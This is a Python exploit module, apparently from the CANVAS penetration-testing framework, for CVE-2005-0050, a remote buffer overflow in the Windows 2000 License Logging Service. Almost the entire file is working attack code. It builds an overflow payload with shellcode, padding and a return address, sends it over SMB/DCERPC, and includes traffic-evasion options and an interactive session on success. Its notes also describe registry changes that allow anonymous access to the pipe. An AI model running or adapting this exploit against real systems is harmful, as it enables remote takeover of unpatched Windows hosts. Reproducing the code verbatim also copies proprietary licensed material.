#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')
import struct

from exploitutils import *
from msrpcexploit import msrpcexploit
from MOSDEF import mosdef
import libs.newsmb.libdcerpc as libdcerpc
from libs.newsmb.libdcerpc import s_dce_raw_unistring
from libs.newsmb.libdcerpc import s_dce_win2k_unistring

# GUI info
NAME = 'Microsoft License Logging Service Buffer Overflow'
DESCRIPTION = 'Microsoft License Logging Service .data Buffer Overflow'
DOCUMENTATION = {}
DOCUMENTATION["CVE Name"] = "CVE-2005-0050"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0050"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS05-010.mspx'
DOCUMENTATION['Note'] = ''
VERSION = '0.1'
PROPERTY = {}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Remote'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['2000']

CHANGELOG = """
KK 08/13/07:
- Rewritten the 2000 part
- Removed NT 4.0 part, too unreliable.
"""

NOTES = """
This exploit works on SLIPSTREAMED Windows 2000 SP4 by default 
since they kept the llsrpc pipe NULL-SESSIONABLE. But if you
installed SP4 by hand, remote anonymous access got removed. However,
you can of course use credentials to access this pipe.

How to make llsrpc pipe NULL-SESSIONABLE:
- Goto registry key-> HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\
- Right click and modify the NullSessionPipes value
1- Delete the last two 00 00 bytes
2- Add 4C 00 4C 00 53 00 52 00 50 00 43 00 00 00 00 00
3- Hit OK
4- Make sure LLSRPC pipe is added to the list successfully
- Now you can crash win2k server llssrv.exe remotely
"""

targets = {
    0: ['Autoversioning N/A', 0],
    1: ['Windows 2000 Server SP4', 0x001f5028],
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name      = NAME
        self.version   = 0
        self.badstring = '\0'
        self.subesp    = 2000
        self.myDCE     = None

    def test(self):
        self.getargs()
        if self.connect(u'57674cd0-5200-11ce-a897-08002b2e9c6d', u'1.0'):
            self.port = self.myDCE.dcerpc_connection.port
            self.testOS()
            return 1

        self.log('Test failed')
        return 0

    def testOS(self):
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        print 'target=%s->%s' % (self.target,app.target)
        result = app.run()
        if result == 0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        if app.result.find('2000') > -1:
            self.version = 1
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0

    def buildConnectionList(self):
        self.connectionList = ['ncacn_np:%s[\\llsrpc]' % (self.host)]
        return self.connectionList

    def connect(self, UUID, uuidversion):
        connectionList = self.buildConnectionList()
        res = None
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2

        for binding in connectionList:
            try:
                self.myDCE = libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                              frag_level=frag_level)
                res = self.myDCE.bind(UUID, uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    self.log('Connected to %s' % binding)
                    return 1
            except Exception, msg:
                self.log(msg)
                
        self.log('Could not connect to remote server - service is not running or the host is firewalled.')
        return 0

    def LlsrLicenseRequest(self, data):
        packet = ''
        packet += s_dce_raw_unistring(data)
        packet += struct.pack('<L', ((len(data)/2)-1))
        packet += struct.pack('<LLLL', 1, 0, 0, 0)
        self.myDCE.call(0, packet, response=True)


    def LlsrConnect(self):
        packet = ''
        packet += s_dce_win2k_unistring('PHOENIX')
#        self.myDCE.set_timeout(600)
        self.log('LlsrConnect')
        self.myDCE.call(0, packet, response=True)
        response = self.myDCE.reassembled_data
        self.log('LlsrConnect response')
        
        if len(response) != 24:
            raise Exception, 'Invalid response received!'
        
        handle = struct.unpack('>20s', response[:20])[0]
        status = struct.unpack('>L', response[20:])[0]

        self.log('Handle: %s Status: %d' % (hexprint(handle), status))

        if status != 0:
            self.log('LlsrConnect failed with %08x' % (status))
            return ''
        return handle

    def LlsrLicenseAdd(self, handle):
        packet = ''
        packet += handle
        packet += struct.pack('<LL', 1, 1)
        packet += struct.pack('<LL', 0x0040d1c0, 0x0040d1c4)
        packet += struct.pack('<LLL', 1, 0, 0)
        packet += struct.pack('<LL', 0x0040d1c8, 0x0040d1cc)
        packet += struct.pack('<LL', 2, 0)
        packet += struct.pack('<L', 0x0040d1d0)
        packet += struct.pack('<LLLLL', 0, 0, 0, 0, 0)
        packet += s_dce_raw_unistring('')
        packet += s_dce_raw_unistring('')
        packet += s_dce_raw_unistring('')
        packet += s_dce_raw_unistring('')
        packet += s_dce_raw_unistring('')
        self.myDCE.call(4, packet, response=False)

    def run(self):
        self.getargs()
        if self.version == 0:
            self.testOS()
            if self.version == 0:
                self.log('Could not automatically determine version!')
                self.result_error = self.ERR_NO_VERSION
                return 0
        self.info, self.eip = targets[self.version]

        data=''
        self.setInfo('%s attacking %s:%d - (in progress)' % (self.name, self.host, self.port), showlog=True)
        try:
            data += self.shellcode
            data += 'A'*(428*2-len(data))
            data += struct.pack('<L', 0xfffffffe)
            data += 'B'*(434*2-len(data))
            data += struct.pack('<L', self.eip)
            data += mosdef.assemble('jmp $-%d' % (len(data)+5), 'x86')
            data += 'C'*(468*2-len(data))
            data += struct.pack('<LLL', 0x01017288, 0x0101768c, 0x01017690) #magic DWORDs
            data += 'DD'
            self.connect(u'57674cd0-5200-11ce-a897-08002b2e9c6d', u'1.0')
            self.LlsrLicenseRequest(data)
            self.connect(u'342cfd40-3c6c-11ce-a893-08002b2e9c6d', u'0.0') #implement AlterContext sometime
            handle = self.LlsrConnect()
            if handle == '':
                raise Exception, 'Invalid handle returned!'
            self.LlsrLicenseAdd(handle)
        except Exception, msg:
            self.setInfo('%s attacking %s:%d (failed)' % (self.name, self.host, self.port), showlog=True)
            self.log('Failed reason: %s' % (str(msg)))
            return 0
        time.sleep(5)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d (succeeded!)' % (self.name, self.host, self.port), showlog=True)
            self.log('%s done (succeeded!)' % self.name)
            return 1
        self.setInfo('%s attacking %s:%d (failed)' % (self.name, self.host, self.port), showlog=True)
        self.log('%s done (failed)' % self.name)

        return 0
    
    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print '%d: %s' % (i, listline[0])
            i = i+1
    
if __name__=='__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
